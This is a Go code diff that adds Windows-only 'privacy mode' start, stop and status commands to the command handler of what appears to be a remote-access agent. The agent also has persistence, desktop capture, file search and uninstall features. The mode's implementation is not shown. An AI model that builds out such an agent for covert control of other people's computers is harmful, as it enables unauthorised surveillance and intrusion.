@@ -22,6 +22,7 @@ import (
 	"overlord-client/cmd/agent/filesearch"
 	"overlord-client/cmd/agent/persistence"
 	"overlord-client/cmd/agent/plugins"
+	"overlord-client/cmd/agent/privacy"
 	"overlord-client/cmd/agent/runtime"
 	"overlord-client/cmd/agent/securelog"
 	"overlord-client/cmd/agent/sysinfo"
@@ -85,6 +86,8 @@ func resetForReconnect(env *runtime.Env) {
 	if env == nil {
 		return
 	}
+
+	privacy.Stop()
 
 	cancelAllCommands()
 	capture.ResetFrameSlots()
@@ -693,6 +696,10 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		env.DesktopCancel = nil
 		env.DesktopDone = nil
 		env.DesktopMu.Unlock()
+		if privacy.IsEnabled() {
+			privacy.Stop()
+			log.Printf("privacy: auto-disabled on desktop stop")
+		}
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
 	case "desktop_select_display":
@@ -2451,6 +2458,16 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
 		}
 		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
+	case "privacy_start":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		_ = handlePrivacyStart(ctx, env, cmdID, payload)
+		return nil
+	case "privacy_stop":
+		_ = handlePrivacyStop(ctx, env, cmdID)
+		return nil
+	case "privacy_status":
+		_ = handlePrivacyStatus(ctx, env, cmdID)
+		return nil
 	case "uninstall":
 		res := wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true}
 		_ = wire.WriteMsg(ctx, env.Conn, res)
@@ -2571,4 +2588,45 @@ func toInt(v interface{}) int {
 		return int(f)
 	}
 	return 0
+}
+
+func handlePrivacyStart(ctx context.Context, env *runtime.Env, cmdID string, payload map[string]interface{}) error {
+	if goruntime.GOOS != "windows" {
+		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
+			Type: "command_result", CommandID: cmdID, OK: false,
+			Message: "privacy mode is only supported on Windows",
+		})
+	}
+	if privacy.IsEnabled() {
+		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
+			Type: "command_result", CommandID: cmdID, OK: true,
+			Message: "privacy mode already active",
+		})
+	}
+	if err := privacy.Start(); err != nil {
+		log.Printf("privacy: start failed: %v", err)
+		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
+			Type: "command_result", CommandID: cmdID, OK: false,
+			Message: err.Error(),
+		})
+	}
+	log.Printf("privacy: mode enabled")
+	return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
+		Type: "command_result", CommandID: cmdID, OK: true,
+	})
+}
+
+func handlePrivacyStop(ctx context.Context, env *runtime.Env, cmdID string) error {
+	privacy.Stop()
+	log.Printf("privacy: mode disabled")
+	return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
+		Type: "command_result", CommandID: cmdID, OK: true,
+	})
+}
+
+func handlePrivacyStatus(ctx context.Context, env *runtime.Env, cmdID string) error {
+	enabled := privacy.IsEnabled()
+	return wire.WriteMsg(ctx, env.Conn, wire.PrivacyStatus{
+		Type: "privacy_status", Enabled: enabled,
+	})
 }
